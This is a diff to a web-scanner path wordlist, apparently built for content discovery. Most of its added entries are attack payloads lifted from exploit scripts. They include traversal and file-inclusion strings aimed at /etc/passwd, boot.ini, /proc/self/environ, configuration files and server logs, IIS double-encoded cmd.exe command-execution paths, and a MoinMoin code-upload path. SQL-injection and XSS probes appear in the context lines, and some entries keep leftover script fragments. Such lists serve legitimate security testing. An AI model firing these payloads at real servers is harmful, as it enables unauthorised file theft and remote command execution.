-./7012.txt/webadmin/index.php?index.php?page=background/../../MySQL/my.ini%00
-./7012.txt/webadmin/index.php?page=background/../../../../../../../../boot.ini%00
-./7012.txt/webadmin/index.php?page=background/../../Bin/hMailServer.INI%00
-./7031.php:/modules/3rdparty/adminpart/add3rdparty.php?module=../../../../../../etc/passwd
-./7031.php:/modules/articles/adminpart/addarticles.php?module=../../../../etc/passwd
-./7031.php:/modules/brandnews/adminpart/addbrandnews.php?module=../../../etc/passwd
-./7031.php:/modules/contact/adminpart/addcontact.php?module=../../../../etc/passwd
-./7031.php:/modules/game/adminpart/addgame.php?module=../../../../etc/passwd
-./7031.php:/modules/newsletter/adminpart/addnewsletter.php?module=../../../../etc/passwd
-./7031.php:/modules/plain/adminpart/addplain.php?module=../../../../../etc/passwd
-./7031.php:/modules/polling/adminpart/addpolling.php?module=../../../../../etc/passwd
-./7031.php:/modules/product/adminpart/addproduct.php?module=../../../../etc/passwd
-./7031.php:/modules/tour/adminpart/addtour.php?module=../../../etc/passwd
-./7159.php:/functions_navlinks.php?pun_user[language]=../../../../../etc/passwd
-./7159.php:/functions_navlinks.php?pun_user[language]=../../../etc/passwd%00
-./7159.php:/profile_send.php?pun_user[language]=../../../../../etc/passwd
-./7159.php:/profile_send.php?pun_user[language]=../../../../etc/passwd%00
-./7159.php:/viewtopic_PM-link.php?pun_user[language]=../../../../../etc/passwd
-./7159.php:/viewtopic_PM-link.php?pun_user[language]=../../../../etc/passwd%00
-./7512.php:/cms cat ../../../etc/passwd
-./8268.php:/modules/chat/dac.php?sendChatData=/../../../system/cache/logs/
-./8271.php:/data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
-./8276.pl:/index.php?page=../../../../../../../../../";
-./8357.py:/iDB/ ../../../../etc/passwd johndoe s3cr3t"
-./8559.c:/webSPELL/picture.php?id=../../../../../etc/passwd
-./8659.php:/bitweaver/boards/boards_rss.php?version=/../../../../bookoo.php%00
-./8659.php:/bitweaver/boards/boards_rss.php?version=/../../../../bookoo_ii.php%00&u=bookoo&p=password
-./8659.php:/bitweaver/boards/boards_rss.php?version=/../../../../index.php%00
-./8659.php:/bitweaver/boards/boards_rss.php?version=/../../../../themes/templates/footer_inc.tpl%00&u=bookoo&p=password
-./8681.php:/example/index.php?do=../../../../../inc/mod/ipban.mdu%00 
-./8681.php:/example/index.php?do=../../../../db/base/ipban.MYD%00
-./9922.txt;/index.php?obj_id=/../../../../../../../../../../proc/self/environ%00
 .0
 .7z
 .AppleDB
@@ -11350,10 +11034,6 @@ $file="admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/pa
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-/Gallery/phpThumb.php?src=../../../etc/passwd
-/glossword/index.php?t=../../../../../../../../../../../../../etc/passwd%00
-/index.php?sensor_program=lmsensors.inc.php/../../README%00
-/ovecms/?load=../../../../../../../../../../etc/passwd%00
 0
 0,,5287926,00.html
 0,,5293725,00.html
@@ -19958,6 +19638,15 @@ $file="admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/pa
 :
 ;/..;/application.properties
 ;/..;/manager
+;/?action=showHome&language=../../../../../../../../../../etc/passwd%00.jpg
+;/cmsmini/view/?path=../../../../../../../../boot.ini%00&p=index.html
+;/cmsmini/view/?path=cwh&p=../../../../../../../../boot.ini%00.html
+;/helppage.php?page=../../../../etc/passwd%00
+;/index.php?action=userLogin&language=../../../../../../../../../../etc/passwd.jpg
+;/index.php?obj_id=/../../../../../../../../../../proc/self/environ%00
+;/login.php3?login_name=x&passwd=x&locale_id=../../../../../../../../boot.ini%00.jpg
+;/multiadmin/js/lib/?action=../../../../../../../../../../etc/passwd&language=de
+;/user.php?action=../../../windows/win.ini%00.jpg
 </etc/passwd>
 <document_root>/ReportRequest
 <input type="hidden" name="_skin" value="../../../../../../../../tmp">
@@ -20014,6 +19703,7 @@ $file="admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/pa
 ?GLOBALS[SKIN]=../../../../../boot.ini%00
 ?GLOBALS[SKIN]=../../../etc/passwd%00
 ?Key=PhoneRequestAuthorization
+?Lang=../../../../../../../../etc/passwd%00
 ?M=A
 ?N=D
 ?Open
@@ -32956,6 +32646,7 @@ Gallery/
 Gallery/Gallery/type.asp
 Gallery/gal_id/1/
 Gallery/phpThumb.php
+Gallery/phpThumb.php?src=../../../etc/passwd
 Gallery/suntzu.php
 Gallery/type.asp
 Gallery2
@@ -39707,6 +39398,7 @@ MIT-LICENSE.txt
 MITLicense.txt
 MIndex.php
 MK
+MKPortal/ ../../../../../../../../../../../../etc/passwd
 MKT
 ML
 MLA
@@ -39771,6 +39463,9 @@ MS
 MS-Bot-Killer.asp
 MS.html
 MSADC
+MSADC/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+MSADC/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 MSBuild
 MSBuild.Community.Tasks 1.2.0.306.msi
 MSBuild.Community.Tasks.Targets
@@ -40922,6 +40617,8 @@ MindMeister
 MindMovies
 MindTerm
 Mini
+MiniBB/../../../../../etc/passwd 
+MiniBB/../../../../../windows/php.ini 
 MiniCMS-1.10/mc-admin/post-edit.php
 MiniCMS-1.10/mc-admin/post.php
 MiniCMS-master/MiniCMS-master/mc-admin/conf.php
@@ -43577,6 +43274,9 @@ PBCPPlayer.asp
 PBEnt
 PBS
 PBSCCatalog.asp
+PBServer/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+PBServer/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 PBWEditor
 PBX10
 PBX91
@@ -48071,6 +47771,9 @@ RowScrollFramePeopleware_OnLoad
 Rowset
 Rowset.php
 Rozas-Madrid-Las
+Rpc/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+Rpc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 Rsa
 Rsa.php
 RsdHandler.cs
@@ -50129,6 +49832,7 @@ Show.aspx.designer.cs
 Show.vm
 ShowAd.aspx
 ShowAlbum
+ShowAlbum?ShowDetails&1&nocount&/../../../../../../../../../..//etc/passwd
 ShowAll
 ShowAreaMap
 ShowArticle.asp
@@ -50153,6 +49857,7 @@ ShowFile.aspx
 ShowForm.aspx
 ShowForum.asp
 ShowGraphic
+ShowGraphic?/../../../../../../../../etc/passwd
 ShowHeadPic.asp
 ShowHighLight_OnClick
 ShowImage
@@ -50196,6 +49901,7 @@ ShowUser.%EXT%
 ShowUser.asp
 ShowUserMenu
 ShowVideo
+ShowVideo?1&fullnocount&/../../../../../../../../../..//etc/passwd
 ShowWidget.aspx
 Showboard.php
 Showcase
@@ -56326,6 +56032,10 @@ WikiError.php
 WikiName
 WikiRenderer.conf.php
 WikiRenderer.lib.php
+WikiSandBox?action=twikidraw&do=modify&target=../../../../moin.wsgi" % target, cookies=jar)
+WikiSandBox?action=twikidraw&do=modify&target=../../../plugin/action/moinexec.py" % target, cookies=jar)
+WikiSandBox?action=twikidraw&do=save&ticket=%s&target=../../../../moin.wsgi" % (target, ticket_hash)
+WikiSandBox?action=twikidraw&do=save&ticket=%s&target=../../../plugin/action/moinexec.py" % (target, ticket_hash)
 WikiUser/LDAP.php
 Wikilink.php
 Wikka
@@ -56689,6 +56399,7 @@ XOOPS_copyrights.txt
 XP
 XPLOR
 XPM4
+XPWeb_v3.3.2/Download.php?url=../../../../../../../etc/passwd
 XPath
 XPath.%EXT%
 XPath.class.php
@@ -57123,6 +56834,7 @@ ZykeCMSV1.0/images/logo/
 [Originals]
 [PaTh]/includes/functions.php
 [Php-Fusion]/infusions/rank_system/forum.php
+[Proxima_path]/modules/Forums/bb_smilies.php?name=../../../../../../etc/passwd%00
 [SAXON-DIRECTORY]/admin/edit-item.php
 [SCRIPT_PATH]/userreg.php
 [SecCheck]/..%252f..%252f../ext.ini
@@ -59275,7 +58987,13 @@ _mediaplayer
 _medienid
 _mem_bin
 _mem_bin/
+_mem_bin/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+_mem_bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+_mem_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+_mem_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+
+_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 _mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
+_mem_bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 _mem_bin/FormsLogin.asp
 _mem_bin/auoconfig.asp
 _mem_bin/autoconfig.asp
@@ -59474,6 +59192,7 @@ _pinger
 _pix
 _play.cfm
 _player
+_plugin/%s/../../../../../../etc/passwd
 _plugin/fckeditor/editor/filemanager/connectors/test.html
 _plugin/subscriber/inc/post.php
 _plugins
@@ -59917,8 +59636,14 @@ _vti_aut
 _vti_aut/
 _vti_bin
 _vti_bin/
+_vti_bin/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+_vti_bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 _vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
+_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+
+_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 _vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
+_vti_bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 _vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
 _vti_bin/CGImail.exe
 _vti_bin/_vti_adm/admin.dll
@@ -60056,6 +59781,7 @@ _vti_cfn
 _vti_cnf
 _vti_cnf.htm
 _vti_cnf/
+_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 _vti_cnf/_vti_cnf/
 _vti_cnt
 _vti_conf
@@ -62362,6 +62088,7 @@ add_user.asp
 add_user.php
 add_user.rhtml
 add_user.tpl
+add_user.tpl.php
 add_user_form.php
 add_user_meta
 add_user_to_blog
@@ -63244,6 +62971,7 @@ admin.php?en_log_id=0&action=users
 admin.php?mode=edit
 admin.php?module=../../../../../etc/passwd
 admin.php?op=adminSupport&zahl=0&torder=&tcounter=15&ids=99991%27/**/unIon/**/Select/**/1,2,3,4,CONCAT(unhex(hex(TABLE_NAME))),6,7,8,9,10,11/**/frOM/**/INFORMATION_SCHEMA.COLUMNS/**/liMIT/**/-1/*
+admin.php?op=modifyUser
 admin.php?page=cat_options&section=status
 admin.php?section=../../../../../../../../../../etc/passwd%00
 admin.php?show=../../../../../../../etc/passwd
@@ -63536,6 +63264,7 @@ admin/admin_smilies.php
 admin/admin_staffs.php
 admin/admin_status.php
 admin/admin_styles.php
+admin/admin_styles.php?mode=addnew&install_to=../../../../../../../../../../../../../../../../../../../tmp&sid=";
 admin/admin_topic_action_logging.php
 admin/admin_user_delete.php
 admin/admin_users.php
@@ -64134,6 +63863,7 @@ admin/includes/admin_nav.inc.php
 admin/includes/application_bottom.php
 admin/includes/application_top.php
 admin/includes/applications/services/pages/uninstall.php
+admin/includes/applications/services/pages/uninstall.php?module=../../../../../../../../cmd
 admin/includes/attributes_preview.php
 admin/includes/author_panel_header.php
 admin/includes/configure.php~
@@ -64292,6 +64022,7 @@ admin/mailIdsConfig.do
 admin/mailer.php
 admin/main.asp
 admin/main.php
+admin/main.php?sid=../../../../../../windows/temp/phpFFFF.tmp%00
 admin/manage-admin.php
 admin/manage-settings.php
 admin/manage_backups.py
@@ -65507,6 +65238,7 @@ admin_wjg
 admin_words.php
 admin_xiangmu.asp
 admin_xmglzn.asp
+admin_xs.php?phpEx=../../../../../../../../../../../../../../../../etc/passwd%00
 admin_xsglzn.asp
 admin_xuebao.asp
 admin_xueshu.asp
@@ -65886,6 +65618,7 @@ administrator/components/com_webring/admin.webring.docs.php
 administrator/components/com_wmtportfolio/admin.wmtportfolio.php
 administrator/components/com_wmtrssreader/admin.wmtrssreader.php
 administrator/components/com_xcloner-backupandrestore/cloner.cron.php
+administrator/components/com_xcloner-backupandrestore/cloner.cron.php?config=../../../../../../../../etc/passwd
 administrator/components/com_xcloner-backupandrestore/index2.php
 administrator/components/com_xcloner-backupandrestore/restore/XCloner.php
 administrator/create_admin_parse.php
@@ -66608,6 +66341,7 @@ adsadvanced.php
 adsale.php
 adsales
 adsamples/
+adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 adsamples/config/site.csc
 adsbot-google
 adsdata
@@ -67553,6 +67287,7 @@ agregador
 agregar
 agregar.GIF
 agregar.php
+agregar_info.php?tabla=../../../../../../../../../../../../../../../../etc/passwd%00";
 agres
 agri
 agricoltura
@@ -69934,6 +69669,7 @@ api/geo
 api/get
 api/goatgates
 api/graphql
+api/homematic.cgi
 api/hosts     
 api/identity
 api/identity/envelope
@@ -75100,6 +74836,7 @@ basicdemo
 basicfail.htm
 basicgrey
 basicindex.tpl
+basicindex.tpl.php
 basicinfo.cfm
 basicinfocheck.cfm
 basicos
@@ -75351,6 +75088,7 @@ bb_func_vthread.php
 bb_func_vtopic.php
 bb_functions.php
 bb_lib/abbc.css.php
+bb_lib/abbc.css.php?design_path=../../../../../../../../../etc/passwd%00
 bb_lib/checkdb.inc.php
 bb_memberlist.php
 bb_news_config.inc
@@ -76883,6 +76621,10 @@ bitweaver/articles/list.php/
 bitweaver/blogs/list_blogs.php
 bitweaver/blogs/list_blogs.php/
 bitweaver/blogs/rankings.php/
+bitweaver/boards/boards_rss.php?version=/../../../../bookoo.php%00
+bitweaver/boards/boards_rss.php?version=/../../../../bookoo_ii.php%00&u=bookoo&p=password
+bitweaver/boards/boards_rss.php?version=/../../../../index.php%00
+bitweaver/boards/boards_rss.php?version=/../../../../themes/templates/footer_inc.tpl%00&u=bookoo&p=password
 bitweaver/calendar/index.php/
 bitweaver/events/index.php/
 bitweaver/events/list_events.php/
@@ -79483,6 +79225,7 @@ bugs/forgot_password.php?email=\"><script>alert(document.cookie)</script>
 bugs/index.php
 bugs/index.php?err=3&email=\"><script>alert(document.cookie)</script>
 bugs/report.php
+bugs/report.php?lang=../../../../../etc/passwd
 bugs/view.php
 bugtest+/+
 bugtest-hidden-selects.html
@@ -82515,6 +82258,7 @@ categories.htm
 categories.html
 categories.inc.php
 categories.php
+categories.php?config[db_type]=../../../../../../../../../../../etc/passwd%00        #
 categories.php?theme=../../../../../../../../../etc/passwd%00
 categories.phtml
 categories.searchbot.php
@@ -83520,6 +83264,10 @@ cgi-bin/
 cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%49%4E%4E%54%2F%73%79%73%74%65%6D%33%32%2Fping.exe%20127.0.0.1
 cgi-bin/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%57%69%6E%64%6F%77%73%2Fping.exe%20127.0.0.1
 cgi-bin/%2e%2e/abyss.conf
+cgi-bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+cgi-bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+cgi-bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
+cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
 cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe
@@ -83913,7 +83661,10 @@ cgi-bin/drknow.cgi
 cgi-bin/drknow.cgi?req=login
 cgi-bin/dumpenv.pl
 cgi-bin/e-cms/vis/vis.pl
+cgi-bin/e-cms/vis/vis.pl?s=../../../../etc/passwd%00
+cgi-bin/e-cms/vis/vis.pl?s=001&p=../../../../etc/passwd%00
 cgi-bin/eboard40/index2.cgi
+cgi-bin/eboard40/index2.cgi?frames=yes&board=demo&mode=Current&threads=Collapse&message=../../../../../../../../../../../etc/passwd%00
 cgi-bin/echo.bat
 cgi-bin/echo.bat?&dir+c:\
 cgi-bin/edit.pl
@@ -84039,6 +83790,7 @@ cgi-bin/hello.bat?&dir+c:\
 cgi-bin/help/doIt.cgi
 cgi-bin/help/doIt.cgi?FUNC=load_xml_file&xml_path=../../../../../../../../../../etc/passwd
 cgi-bin/his-webshop.pl
+cgi-bin/his-webshop.pl?t=../../../../../../../../etc/passwd%00
 cgi-bin/hitview.cgi
 cgi-bin/horde/test.php
 cgi-bin/horde/test.php?mode=phpinfo
@@ -84092,6 +83844,7 @@ cgi-bin/interfaces.cgi
 cgi-bin/ion-p
 cgi-bin/ion-p.exe
 cgi-bin/ion-p.exe?page=c:\winnt\repair\sam
+cgi-bin/ion-p?page=../../../../../etc/hosts
 cgi-bin/ion-p?page=../../../../../etc/passwd
 cgi-bin/ipinfo.cgi
 cgi-bin/iucrsearch
@@ -84152,6 +83905,7 @@ cgi-bin/lwgate.cgi
 cgi-bin/mac.cgi
 cgi-bin/magiccard.cgi
 cgi-bin/magiccard.cgi?pa=3Dpreview&amp;next=3Dcustom&amp;page=3D../../../../../../../../../../etc/passwd
+cgi-bin/magiccard.cgi?pa=preview&next=custom&page=../../../../../../../../../../etc/passwd
 cgi-bin/mail
 cgi-bin/mail.cgi
 cgi-bin/mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
@@ -84280,6 +84034,7 @@ cgi-bin/path_to_file/bsml.pl
 cgi-bin/payload.luci
 cgi-bin/pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
 cgi-bin/pcm.cgi
+cgi-bin/pdesk.cgi?lang=../../../../../../../proc/version%00
 cgi-bin/perl
 cgi-bin/perl.exe
 cgi-bin/perl.exe?-v
@@ -84361,6 +84116,7 @@ cgi-bin/ratlog.cgi
 cgi-bin/rb.cgi
 cgi-bin/rdfs.cgi
 cgi-bin/read.cgi
+cgi-bin/read.cgi?page=../../../../../../../../../../../etc/passwd%00
 cgi-bin/readfile.cgi
 cgi-bin/reboot.cgi
 cgi-bin/recover2.cgi
@@ -84540,6 +84296,7 @@ cgi-bin/ttt-in
 cgi-bin/ttt-out
 cgi-bin/ttx.cg
 cgi-bin/ttx.cgi
+cgi-bin/ttx.cgi?cmd=file&fn=../../../../../../etc/passwd
 cgi-bin/twiki/search/Main
 cgi-bin/ultraboard.cgi
 cgi-bin/ultraboard.pl
@@ -84742,6 +84499,7 @@ cgi-mail
 cgi-mod
 cgi-mod/index.cgi
 cgi-mod/view_help.cgi
+cgi-mod/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00
 cgi-moses
 cgi-mvp
 cgi-news
@@ -86637,6 +86395,7 @@ claroline/course/index.php
 claroline/course_description/index.php
 claroline/document/document.php
 claroline/document/rqmkhtml.php
+claroline/document/rqmkhtml.php?cmd=rqEditHtml&file=/../../claroline/inc/conf/claro_main.conf.php
 claroline/exercice/testheaderpage.php
 claroline/exercise/exercise.php
 claroline/group/group_space.php
@@ -86644,6 +86403,7 @@ claroline/inc/installedVersion.inc.php
 claroline/inc/lib/event/init_event_manager.inc.php
 claroline/inc/lib/export_exe_tracking.class.php
 claroline/learnPath/include/scormExport.inc.php
+claroline/learnPath/include/scormExport.inc.php?cmd=ls-la&includePath=/../../../../apache/logs/access.log%00
 claroline/phpMyAdmin/
 claroline/phpbb/newtopic.php
 claroline/phpbb/reply.php
@@ -87166,6 +86926,7 @@ classes/error.php
 classes/file_o.php
 classes/html/com_articles.php
 classes/imgsize.php
+classes/index.php?siteconf[curl]=../../../db/comments/news/".$comments_id."%00
 classes/ircbot.class.php
 classes/main_class.php
 classes/modules.php
@@ -87285,6 +87046,7 @@ classroompages.cfm
 classrooms
 classtree.vsd
 classtrees.tpl
+classtrees.tpl.php
 classtrees_Common.html
 classtrees_Framework.html
 classtrees_Krumo.html
@@ -87813,6 +87575,7 @@ clog_webapi.php
 clogin.asp
 clogs
 cloisterblog/journal.pl
+cloisterblog/journal.pl?syear=2004&sday=11&smonth=../../../../../../../../etc/passwd%00
 clon
 clone
 clone.inc.php
@@ -88047,6 +87810,7 @@ cmps_index.php
 cmr
 cms
 cms 
+cms cat ../../../etc/passwd
 cms-9907605
 cms-Admin
 cms-admin
@@ -88589,6 +88353,7 @@ code/confirm.php
 code/content.php
 code/display.php
 code/exploits$
+code/getgalldata.php
 code/inc_header.php
 code/index.php
 code/log.php
@@ -96307,6 +96072,7 @@ data/messages.php
 data/modules/albums/module_info.php?langpref=../../../../../boot.ini
 data/modules/blog/module_info.php?langpref=../../../../../boot.ini
 data/modules/blog/module_pages_site.php
+data/modules/blog/module_pages_site.php?post=../../../../../../../../../../bin/ls
 data/modules/contactform/module_info.php?langpref=../../../../../boot.ini
 data/now_connect.php
 data/other/authorization.xml
@@ -99964,10 +99730,14 @@ directory.php?dir=%3Bcat%20/etc/passwd
 directory.tmpl
 directory/
 directory/PJreview_Neo.cgi
+directory/PJreview_Neo.cgi?p=/../../../../../../../../../../../../../../../../etc/passwd
 directory/admin/
 directory/blog.cgi
+directory/blog.cgi?submit=ViewFile&month=[month]&year=[year]&file=/../../../../../../../../../../../../../../../../etc/passwd
 directory/genindexpage.cgi
+directory/genindexpage.cgi?13687+Home+/../../../../../../../../../../../../../../../../etc/passwd
 directory/gotopage.cgi
+directory/gotopage.cgi?13686+/../../../../../../../../../../../../../../../../etc/passwd
 directory/graphics/?path=..%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F%2Fetc%2Fpasswd 
 directory/graphics/?path=..%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F..%2F..%2F%2F%2Fetc%2Fpasswd 
 directory/jsp/file.jsp
@@ -100783,6 +100553,7 @@ doc/helpadmin.nsf
 doc/helplt4.nsf
 doc/html/
 doc/index.php
+doc/index.php?s=../../../../var/httpd/logs/error_log%00
 doc/internet.nsf
 doc/javapg.nsf
 doc/lccon.nsf
@@ -102712,6 +102483,7 @@ e107_plugins/psilo/psilo.php
 e107_plugins/zogo-shop/product_details.php
 e107_plugins/zogo-shop/products.php
 e107_themes
+e107language_e107cookie=../../../../../../../../../etc/passwd%00
 e107v4a
 e122202.cfm
 e2
@@ -104436,6 +104208,7 @@ elemente
 elementindex.html
 elementindex.html.svn-base
 elementindex.tpl
+elementindex.tpl.php
 elementindex_Common.html
 elementindex_Framework.html
 elementindex_Krumo.html
@@ -108166,6 +107939,8 @@ example.txt
 example.xml
 example.zip
 example/
+example/index.php?do=../../../../../inc/mod/ipban.mdu%00 
+example/index.php?do=../../../../db/base/ipban.MYD%00
 example/lib/grid3.lib.php
 example0.html
 example0.php
@@ -108758,6 +108533,7 @@ examples/servlets/index.html
 examples/servlets/servlet/CookieExample
 examples/session
 examples/show_code.php
+examples/show_code.php?filename=example03_LRVS.php/../../../../../../../../etc/passwd
 examples/sm-72-target.html
 examples/sm_7.2.3925_file2_burp_1.3.08.html
 examples/sm_7.2.3925_interim_report_1.htm
@@ -111598,6 +111374,7 @@ fileshow.asp
 filesimages
 filesme
 filesource.tpl
+filesource.tpl.php
 filestorage
 filestore
 filestores
@@ -113002,6 +112779,7 @@ footer.thtml
 footer.tmpl
 footer.tpl
 footer.tpl.html
+footer.tpl.php
 footer.txt
 footer.vtp
 footer.xml
@@ -113790,6 +113568,7 @@ forum/include/error/autherror.cfm
 forum/index.cfm
 forum/index.php
 forum/index.php? app=core&module=global&section=register/register/page__section__../../../../../../../../../../../../../../../../../../../../../tmp/inc
+forum/index.php?act=module&module=gallery&cmd=viewimage&img=&file_type=&dir=../../../../../../etc/passwd
 forum/index.php?app=core&module=global&section=register&any=?section=../../../../../../../../../../../../../../../../../../../../../../../../../../tmp/inc
 forum/index.php?board=1;action=modify2;delAttach=on;attachOld=../../../../d
 forum/index.php?method=&lt;script&gt;alert('Vulnerable')&lt;/script&gt;
@@ -115522,6 +115301,7 @@ frontend/x2/fantastico/autoinstall4imagesgalleryupgrade.php
 frontend/x3/fantastico/autoinstall4imagesgalleryupgrade.php
 frontend/x3/fantastico/autoinstallhome.php
 frontend/x3/fantastico/index.php
+frontend/x3/fantastico/index.php?sup3r=../../../../../../etc/passwd%00 .
 frontend/x3/files/dofileop.html
 frontend/x3/files/fileop.html
 frontend/x3/ftp/doaddftp.html
@@ -116057,6 +115837,7 @@ function.testme.php
 function.textarea.php
 function.title.php
 function.tpl
+function.tpl.php
 function.tree.php
 function.unlink
 function.url.php
@@ -116195,6 +115976,8 @@ functions_metatags.php
 functions_mod_user.php
 functions_mods_settings.php
 functions_module.php
+functions_navlinks.php?pun_user[language]=../../../../../etc/passwd
+functions_navlinks.php?pun_user[language]=../../../etc/passwd%00
 functions_nuke.php
 functions_online.php
 functions_payment.php
@@ -117366,6 +117149,7 @@ gedrecord.php
 geek
 geeklog
 geeklog/admin/configuration.php
+geeklog/fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php?Command=FileUpload&Type=File
 geeklog/getimage.php
 geeklog/users.php
 geekmail
@@ -119090,6 +118874,7 @@ glossary_q.html
 glossaryofterms
 glosslatest/glossword/1.8/gw_admin.php
 glossword/1.8
+glossword/index.php?t=../../../../../../../../../../../../../etc/passwd%00
 glossword_path/index.php
 glossy
 glosuj
@@ -120833,6 +120618,7 @@ gwadmin-console/install/login.jsp
 gwagos.aspx
 gwback.aspx
 gwbacks2s.ashx
+gwebmail/?module=../../../../etc/passwd%00
 gwebservicegfs.php
 gwextranet/scp.dll/nbfile
 gwextranet/scp.dll/sendto
@@ -121449,6 +121235,7 @@ header.thtml
 header.tmpl
 header.tpl
 header.tpl.html
+header.tpl.php
 header.txt
 header.vtp
 header.xml
@@ -121804,6 +121591,15 @@ help.php
 help.php3
 help.php?
 help.php?chapter=<script>alert('Vulnerable')</script>
+help.php?module=../../../../../../../../../../logs/access.log
+help.php?module=../../../../../../../../../../logs/error.log
+help.php?module=../../../../../../../../../../var/log/access_log
+help.php?module=../../../../../../../../../../var/log/apache/error.log
+help.php?module=../../../../../../../../../../var/log/apache/error_log
+help.php?module=../../../../../../../../../../var/log/httpd/access.log
+help.php?module=../../../../../../../../../../var/log/httpd/access_log
+help.php?module=../../../../../../../../../../var/log/httpd/error.log
+help.php?module=../../../../../../../../../../var/log/httpd/error_log
 help.phtml
 help.png
 help.shtml
@@ -121840,6 +121636,7 @@ help/helplt4.nsf
 help/home.html
 help/index.htm
 help/index.php
+help/index.php?help_file=../../../../../../etc/passwd
 help/index.php?screen=../../../../../../../../etc/voipnow/voipnow.conf
 help/internet.nsf
 help/javapg.nsf
@@ -123809,6 +123606,7 @@ html/error.php
 html/faq.php
 html/filter_prefs.php
 html/footer.php
+html/footer.php?_SESSION[nocc_theme]=../../../../../../../../etc/passwd%00
 html/forum.inc.php
 html/functions.php
 html/gfxgen.php
@@ -125419,6 +125217,7 @@ iCampus
 iContact
 iControl/iControlPortal.cgi
 iDB/
+iDB/ ../../../../etc/passwd johndoe s3cr3t"
 iDEAL
 iDeal
 iDebug
@@ -126062,6 +125861,8 @@ iis_rewrite
 iisadmin
 iisadmin/
 iisadmpwd
+iisadmpwd/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+
+iisadmpwd/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+
 iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir
 iisadmpwd/..%c0%af../winnt/system32/cmd.exe?/c+dir
 iisadmpwd/achg.htr
@@ -127861,6 +127662,7 @@ include.inc.php
 include.php
 include.php?path=contact.php&contact_email=\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
 include.tpl
+include.tpl.php
 include/
 include/DFF_affiliate_client_API.php
 include/DFF_featured_prdt.func.php
@@ -127872,6 +127674,7 @@ include/DFF_sku.func.php
 include/ListView/ListViewSubPanel.php
 include/SQuery/gameSpy2.php
 include/SubPanel/SubPanelViewer.php
+include/SubPanel/SubPanelViewer.php?GLOBALS[sugarEntry]=1&module=1&record=1&beanList[1]=1&theme=../../../../../../../../../../../../etc/passwd%00
 include/VB/vb_board_functions.php
 include/_bot.php
 include/account.inc.php
@@ -127967,6 +127770,7 @@ include/display/user_feedback.inc.php
 include/display/user_info.inc.php
 include/do_reg.inc.php
 include/doc/get_image.php
+include/doc/get_image.php?lang=&img=../../../../../etc/passwd
 include/doc/index.php
 include/doc/index.php?page=../../../../../etc/passwd
 include/dom.php
@@ -128110,6 +127914,7 @@ include/scripts/send_email_cache.php
 include/searchbar.class.php3
 include/searchlib.php3
 include/security.inc.php
